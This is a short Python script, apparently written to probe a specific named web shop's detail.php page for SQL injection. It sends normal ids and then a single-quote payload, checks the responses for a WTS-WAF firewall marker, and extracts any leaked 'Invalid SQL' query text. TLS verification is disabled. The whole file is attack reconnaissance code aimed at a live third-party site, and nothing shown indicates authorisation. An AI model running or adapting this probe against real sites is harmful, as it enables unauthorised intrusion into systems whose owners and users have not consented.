#!/usr/bin/env python3
import urllib.request, urllib.parse, ssl, re
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='

def get(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
        return r.read(80000).decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        return e.read(80000).decode('utf-8','ignore')
    except Exception as e:
        return 'ERR'

# 正常参数
for v in ['687', '1', '100']:
    b = get(v)
    title = re.search(r'<title>([^<]*)</title>', b)
    print('id=%s -> len=%d WAF=%s title=%s' % (v, len(b), 'WTS-WAF' in b, title.group(1)[:40] if title else '?'))

# 带单引号
b = get("687'")
print('id=687\' -> len=%d WAF=%s SQLERR=%s' % (len(b), 'WTS-WAF' in b, 'Invalid SQL' in b))
if 'Invalid SQL' in b:
    m = re.search(r'Invalid SQL: ([^<]+)', b)
    print('  SQL:', m.group(1)[:120] if m else '')
